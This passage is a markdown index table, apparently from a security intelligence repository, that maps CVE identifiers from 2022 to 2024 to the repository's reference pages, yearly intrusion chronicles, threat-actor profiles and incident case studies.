| [CVE-2022-41082](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41082) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md) |
| [CVE-2022-41091](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41091) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2022-41328](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41328) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-41352](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-41352) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2022-42475](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-42475) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md) |
| [CVE-2022-42856](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-42856) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2022-44698](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-44698) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2022-47966](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-47966) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md) |
| [CVE-2023-0266](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0266) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2023-0386](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0386) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2023-0669](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0669) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Case Studies](/case-studies/README.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md) |
| [CVE-2023-2868](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-2868) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md) |
| [CVE-2023-3519](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-3519) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2023-4346](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4346) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2023-4863](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4863) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md), [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2023-4911](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4911) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2023-4966](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4966) | [CVE Reference Guide](/CVE_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Malware Families Reference](/MALWARE_FAMILIES.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md), [Triage a New CVE in 30 Minutes](/guides/TRIAGE_A_CVE.md) |
| [CVE-2023-6448](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-6448) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Refrigeration-Controller Attacks on European Supermarkets and Blood Services, 2026: A Case Study](/case-studies/EUROPEAN_REFRIGERATION_ATTACKS_2026.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2023-6548](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-6548) | [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2023-6549](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-6549) | [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2023-20198](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20198) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md) |
| [CVE-2023-20269](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20269) | [Malware Families Reference](/MALWARE_FAMILIES.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2023-20273](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20273) | [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md) |
| [CVE-2023-20867](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20867) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md), [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-21715](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-21715) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2023-22515](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-22515) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-22518](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-22518) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-22894](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-22894) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2023-23397](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-23397) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md), [Slide plan: The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/slides/plans/MICROSOFT_OFFICE_CVE_2026_21509.md), [Slide plan: Russia-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2023-24880](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-24880) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-26360](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-26360) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-27350](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-27350) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-27532](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-27532) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The PAN-OS GlobalProtect Authentication Bypass of 2026 (CVE-2026-0257), Qilin and INC Ransomware: A Case Study](/case-studies/PALO_ALTO_PAN_OS_CVE_2026_0257.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Case Studies](/case-studies/README.md), [Slide plan: The PAN-OS GlobalProtect Authentication Bypass of 2026 (CVE-2026-0257), Qilin and INC Ransomware: A Case Study](/case-studies/slides/plans/PALO_ALTO_PAN_OS_CVE_2026_0257.md) |
| [CVE-2023-27997](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-27997) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2023-28252](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-28252) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-28771](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-28771) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-29357](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-29357) | [Starred Repositories Index](/STARRED_REPOS.md) |
| [CVE-2023-32434](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-32434) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2023-32435](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-32435) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2023-34048](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34048) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2023-34362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34362) | [CVE Reference Guide](/CVE_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Malware Analysis Reference](/MALWARE_ANALYSIS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Case Studies](/case-studies/README.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2023-35078](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-35078) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md) |
| [CVE-2023-35081](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-35081) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2023-35082](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-35082) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2023-36025](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-36025) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2023-36584](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-36584) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2023-36884](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-36884) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2023-38035](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-38035) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2023-38606](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-38606) | [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2023-38831](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-38831) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2023-40044](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-40044) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-41061](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-41061) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-41064](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-41064) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-41990](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-41990) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2023-42793](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-42793) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md), [Slide plan: Russia-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2023-44487](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-44487) | [Network Protocols Reference: Security Perspective](/NETWORK_PROTOCOLS_REFERENCE.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Slide plan: The Year 2023 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2023.md) |
| [CVE-2023-46604](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-46604) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md) |
| [CVE-2023-46747](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-46747) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2023-46805](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-46805) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2023-47246](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-47246) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-48788](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-48788) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md) |
| [CVE-2023-49103](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-49103) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2023-50224](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-50224) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2024-0012](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-0012) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-0519](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-0519) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2024-1086](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1086) | [Linux Hardening Reference Library](/LINUX_HARDENING_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-1708](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1708) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The ConnectWise Cloud Backup Compromise of October 2026: A Case Study](/case-studies/CONNECTWISE_STORM_0940_2026.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2024-1709](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1709) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [The ConnectWise Cloud Backup Compromise of October 2026: A Case Study](/case-studies/CONNECTWISE_STORM_0940_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md), [Slide plan: Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/slides/plans/HEALTHCARE_THREAT_WATCHLIST.md), [Slide plan: Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/slides/plans/NABLE_NCENTRAL_ABLE2SHELL_2026.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2024-3094](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-3094) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Supply Chain Security Reference](/SUPPLY_CHAIN_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Case Studies](/case-studies/README.md), [The XZ Utils Backdoor: A 2024 Supply-Chain Case Study](/case-studies/XZ_UTILS_BACKDOOR_2024.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md), [Supply Chain Security](/disciplines/supply-chain-security.md) |
| [CVE-2024-3400](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-3400) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md), [Palo Alto Networks PAN-OS](/operating-systems/pan-os.md), [Splunk Enterprise Security](/tools/splunk.md), [Tenable](/tools/tenable.md) |
